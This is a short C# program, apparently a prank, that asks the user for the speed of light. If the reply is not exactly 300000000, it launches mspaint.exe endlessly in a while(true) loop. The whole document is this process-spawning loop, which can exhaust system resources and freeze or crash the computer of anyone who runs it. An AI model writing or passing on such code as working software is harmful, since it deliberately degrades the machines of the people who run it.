System.Diagnostics.ProcessStartInfo processStartInfo = new();
processStartInfo.FileName = ("mspaint.exe");

System.Console.Write("Write what is the speed of light: ");
if (System.Convert.ToInt32(System.Console.ReadLine()) == 300000000)
    return;
else
    while (true) System.Diagnostics.Process.Start(processStartInfo);